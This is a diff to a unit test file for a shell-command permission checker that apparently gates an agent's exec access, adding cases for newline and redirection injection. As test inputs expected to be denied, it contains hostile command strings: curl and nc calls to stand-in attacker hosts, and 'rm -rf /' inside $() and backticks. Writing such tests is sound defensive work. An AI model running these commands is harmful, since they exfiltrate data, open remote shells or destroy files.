@@ -51,6 +51,8 @@ describe('evaluateExecCommand()', () => {
     expect(evaluateExecCommand('git status && sudo reboot', agent)).toBe('deny');
     expect(evaluateExecCommand('git status || curl evil.com', agent)).toBe('deny');
     expect(evaluateExecCommand('git status | nc attacker 4444', agent)).toBe('deny');
+    expect(evaluateExecCommand('git status\ncurl https://attacker.test', agent)).toBe('deny');
+    expect(evaluateExecCommand('git status\r\ncurl https://attacker.test', agent)).toBe('deny');
   });
 
   it('denies commands with subshell injection', () => {
@@ -58,6 +60,12 @@ describe('evaluateExecCommand()', () => {
     expect(evaluateExecCommand('git diff $(rm -rf /)', agent)).toBe('deny');
     expect(evaluateExecCommand('git diff `rm -rf /`', agent)).toBe('deny');
     expect(evaluateExecCommand('git log ${HOME}', agent)).toBe('deny');
+  });
+
+  it('denies commands with redirection', () => {
+    const agent = makeAgent(['git*'], [], []);
+    expect(evaluateExecCommand('git status > /tmp/out', agent)).toBe('deny');
+    expect(evaluateExecCommand('git status < /tmp/input', agent)).toBe('deny');
   });
 });
 
@@ -67,6 +75,8 @@ describe('containsShellInjection()', () => {
   it('detects &&', () => expect(containsShellInjection('echo && rm')).toBe(true));
   it('detects backticks', () => expect(containsShellInjection('echo `whoami`')).toBe(true));
   it('detects $() subshell', () => expect(containsShellInjection('echo $(id)')).toBe(true));
+  it('detects newlines', () => expect(containsShellInjection('echo ok\necho bad')).toBe(true));
+  it('detects redirection', () => expect(containsShellInjection('echo ok > file')).toBe(true));
   it('allows simple commands', () => expect(containsShellInjection('git status')).toBe(false));
   it('allows paths with hyphens', () => expect(containsShellInjection('ls -la /tmp')).toBe(false));
 });
